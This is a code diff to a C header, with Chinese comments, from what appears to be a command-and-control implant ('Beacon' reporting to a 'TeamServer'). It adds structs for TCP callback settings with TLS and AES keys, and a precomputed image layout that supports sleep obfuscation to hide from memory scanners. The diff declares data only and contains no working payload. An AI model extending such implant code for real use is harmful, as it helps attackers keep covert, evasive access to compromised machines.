@@ -22,6 +22,16 @@ typedef struct HttpProfile {
     INT reconnect_time_ms;      /* 重连间隔（ms） */
 } HttpProfile;
 
+/* external TCP 回连配置 */
+typedef struct TcpExternalProfile {
+    CHAR callback_host[256];    /* TeamServer TCP listener 回连地址 */
+    INT callback_port;          /* TeamServer TCP listener 回连端口 */
+    INT reconnect_count;        /* 重连次数上限 */
+    INT reconnect_time_ms;      /* 重连间隔（ms） */
+    INT ssl;                    /* 是否启用 TLS（SChannel） */
+    CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
+} TcpExternalProfile;
+
 /* internal TCP 级联配置 */
 typedef struct TcpInternalProfile {
     CHAR bind_host[64];         /* 监听地址 */
@@ -42,6 +52,15 @@ typedef enum SleepObfTechnique {
     SLEEP_OBF_ZILEAN = 2       /* RtlRegisterWait */
 } SleepObfTechnique;
 
+/* sleep 混淆定位映像所需的预计算布局 */
+typedef struct SleepObfImageLayout {
+    BOOL valid;                 /* 是否由 profile patch 提供 */
+    UINT32 image_size;          /* OptionalHeader.SizeOfImage */
+    UINT32 text_rva;            /* .text VirtualAddress */
+    UINT32 text_size;           /* .text VirtualSize/RawSize */
+    UINT32 text_protect;        /* .text 原始保护属性 */
+} SleepObfImageLayout;
+
 /* Beacon 通信配置 */
 typedef struct Profile {
     CHAR listener_name[128];    /* 监听器名称 */
@@ -53,7 +72,10 @@ typedef struct Profile {
     INT conn_timeout_sec;       /* 连接超时（秒） */
     BOOL sleep_obf_enabled;     /* 是否启用睡眠混淆 */
     SleepObfTechnique sleep_obf_technique; /* 混淆技术选择 */
+    SleepObfImageLayout sleep_layout; /* 预计算映像布局 */
+    CHAR encrypt_key[128];      /* 通用通信加密 key */
     HttpProfile http;           /* HTTP 传输配置 */
+    TcpExternalProfile tcp_external; /* TCP external 回连配置 */
     TcpInternalProfile tcp_internal; /* TCP 级联配置 */
     SmbInternalProfile smb_internal; /* SMB 级联配置 */
 } Profile;
